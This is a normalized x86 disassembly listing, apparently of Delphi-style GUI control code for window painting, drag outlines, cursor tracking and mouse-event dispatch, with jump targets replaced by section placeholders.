push sub_48e3a5
lea eax [ ebp - 0xc ]
call j_sub_449348
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
call sub_448c38
sub_48e3b0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x1d4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_424744
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_4246e8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_48d81c
lea ecx [ ebp - 0x24 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x14 ]
lea eax [ ebp - 0x14 ]
call sub_432ab0
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x14 ]
lea eax [ ebp - 0x14 ]
call sub_432a08
test al al
jne r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48e438
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_496c14
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x8
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_48d81c
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_496868
push eax
call InvalidateRect
push ebp
call sub_48e3b0
pop ecx
test al al
je r-xdata
mov al 0x1
sub_48e4e0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x2 ] 0x0
cmp [ eax + 0x12a ] 0x0
je r-xdata
movzx eax [ ebp - 0x2 ]
pop ebx
pop ecx
pop ebp
retn 0xc
movzx ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x2 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_48e528
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_477028
mov esi eax
call sub_48ac30
test eax eax
je r-xdata
cmp [ edi + 0xc ] 0x0
jne r-xdata
cmp esi eax
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp ebx eax
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_48f2b0
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_4483f8
jmp r-xdata
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x74 ]
sub_48e5b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_496c14
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x80 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_496868
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_48e68d
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_493eb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_496868
push eax
call ReleaseDC
retn
sub_48e71c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ rw-data ]
call sub_49be20
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_49bee0
mov eax edi
call sub_48f334
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x8b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_48dac0
mov eax [ esp + 0x8 ]
and eax 0xffff
mov edx [ esp + 0xc ]
shl edx 0x10
or eax edx
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_48f2b0
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_48be54
sub_48e80c
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
movzx ecx [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_48e848
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_48e894
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_48e8c0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax [ ebx + 0x40 ]
call sub_48df30
mov edi eax
mov eax [ ebx + 0x40 ]
call sub_48df1c
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x30 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x4c ]
fld [ esp ]
call sub_447960
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_447960
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x4c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x1e3 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x14 ]
call sub_496868
push eax
call GetWindowRect
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x1e3 ] 0x0
je r-xdata
cmp [ eax + 0x1c0 ] 0x0
je r-xdata
movzx edx [ ebx + 0x5c ]
push edx
lea edx [ ebx + 0x4c ]
push edx
mov eax [ eax + 0x1c0 ]
mov ecx [ ebx + 0x60 ]
mov edx [ ebx + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_48e9ac
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_48e9d8
push ebx
push esi
push ecx
mov ebx edx
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop edx
pop esi
pop ebx
retn
mov edx [ ebx ]
mov [ esp ] edx
mov ecx esp
mov esi eax
mov edx eax
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov eax [ esp ]
mov [ ebx ] eax
sub_48ea08
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov edi [ ebx + 0x8 ]
mov eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
push eax
movzx ecx [ edi + 0xd ]
movzx edx [ edi + 0xc ]
mov eax ebp
mov si 0xffd6
call sub_4483f8
and eax 0x7f
mov [ ebx + 0xc ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
sub_48ea3c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov edi eax
mov [ ebp - 0xd ] 0x0
cmp [ edi + 0x142 ] 0x0
je r-xdata
cmp [ ebp - 0xd ] 0x0
jne r-xdata
push ebx
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0xd ]
push eax
movzx ecx [ ebp - 0x1 ]
mov edx edi
mov eax [ edi + 0x144 ]
call [ edi + 0x140 ]
movzx eax [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ edi + 0x94 ] ebx
jmp r-xdata
mov eax [ edi + 0x94 ]
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
cmp [ edi + 0x94 ] 0x0
setl bl
mov eax [ edi + 0x94 ]
cdq
xor eax edx
sub eax edx
sub eax 0x78
mov [ edi + 0x94 ] eax
test bl bl
je r-xdata
lea ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x1 ]
mov eax edi
mov si 0xffe1
call sub_4483f8
mov [ ebp - 0xd ] al
cmp [ edi + 0x94 ] 0x0
je r-xdata
lea ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x1 ]
mov eax edi
mov si 0xffe2
call sub_4483f8
mov [ ebp - 0xd ] al
jmp r-xdata
mov eax [ edi + 0x94 ]
neg eax
mov [ edi + 0x94 ] eax
sub_48eb10
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0xc ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
movzx eax [ esp + 0xc ]
add esp 0x10
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
push edx
lea edx [ esp + 0x10 ]
push edx
mov ebx eax
movzx ecx [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_48eb5c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0xc ] 0x0
cmp [ eax + 0x152 ] 0x0
je r-xdata
movzx eax [ esp + 0xc ]
add esp 0x10
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
push edx
lea edx [ esp + 0x10 ]
push edx
mov ebx eax
movzx ecx [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x154 ]
call [ ebx + 0x150 ]
sub_48eba8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x4c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x64
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_48ecc3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x48 ]
call sub_46df70
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48ecca
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_48ecf4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov esi [ edi + 0x8 ]
mov ebp [ esi + 0x8 ]
mov eax ebp
mov edx [ r-xdata ]
call sub_448388
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax [ esp ]
call sub_48dac0
movzx eax [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax ebp
mov edx [ r-xdata ]
call sub_4483ac
mov ebp [ eax + 0x40 ]
mov eax [ esp + 0xc ]
push eax
movzx eax [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax [ esp + 0xc ]
mov si 0xffdf
call sub_4483f8
mov eax [ esp + 0xc ]
push eax
movzx eax [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax [ esi + 0xc ]
mov si 0xffc3
call sub_4483f8
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
movzx eax [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_4483f8
mov eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax [ esi + 0xc ]
mov si 0xffb5
call sub_4483f8
jmp r-xdata
sub_48ede4
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0x90 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x20 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1e3 ] 0x0
je r-xdata
mov eax ebx
call sub_48f334
cmp [ ebx + 0x90 ] 0x0
je r-xdata
mov eax ebx
call sub_48df1c
push eax
lea eax [ ebp - 0x3c ]
push eax
mov eax ebx
call sub_48df30
mov ecx eax
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
call sub_432b40
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_48efd0
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x2c ]
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_48d98c
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x20 ] eax
cmp [ eax + 0x1c0 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0x90 ]
mov ecx ebx
mov edx edi
mov si 0xffbd
call sub_4483f8
test al al
jne r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x24 ]
mov eax [ eax + 0x1c0 ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebx + 0x90 ]
call sub_496868
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_48b20c
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_48efba
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0x90 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_496868
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x14 ] edi
mov eax [ ebp - 0xc ]
movzx edx [ ebp + 0x8 ]
mov [ eax + 0x5c ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x60 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x4c ]
lea esi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x10 ] eax
push 0x1
lea eax [ ebp - 0x14 ]
push eax
mov eax edi
call sub_496868
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb5
call sub_4483f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4481b0
retn
push 0x2
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_48d81c
test esi esi
je r-xdata
sub_48efd0
push ebx
push esi
push edi
add esp 0xffffffdc
mov esi edx
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0x90 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbd
call sub_4483f8
test al al
jne r-xdata
movzx eax [ esp ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax edi
call sub_490500
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ esp + 0x4 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_4483f8
mov eax esi
call sub_48d8bc
push eax
lea eax [ esp + 0x18 ]
push eax
mov eax esi
call sub_48d878
mov ecx eax
xor edx edx
xor eax eax
call sub_432a2c
lea ecx [ esp + 0x14 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_4483f8
jmp r-xdata
mov [ esp ] al
cmp [ esp ] 0x0
je r-xdata
sub_48f080
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xb2 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_48f0b0
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
movzx edx [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_48f11c
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_48f1dc
sub_48f14c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_48f17c
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_48dac0
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_48f1a8
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_48f1dc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edx [ eax + 0x70 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x70 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x70 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x70 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ ebx ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov edi [ eax ]
call [ edi + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ ebx ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ ebx ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ esi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ esi ] eax
sub_48f2b0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_48f30c
mov edx [ eax + 0x164 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov eax edx
retn
test edx edx
jne r-xdata
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
mov eax ecx
call sub_48f30c
mov edx eax
sub_48f334
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0x9c ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0x98 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x8c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xa4 ] eax
jmp r-xdata
mov eax [ ebx + 0x90 ]
movzx eax [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x8c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa0 ] eax
mov eax [ ebx + 0x90 ]
movzx eax [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_48f3a8
push ebx
mov ebx eax
mov eax [ edx ]
mov [ ebx + 0x40 ] eax
mov eax [ edx + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ edx + 0x8 ]
sub eax [ edx ]
mov [ ebx + 0x48 ] eax
mov eax [ edx + 0xc ]
sub eax [ edx + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_48d40c
mov eax ebx
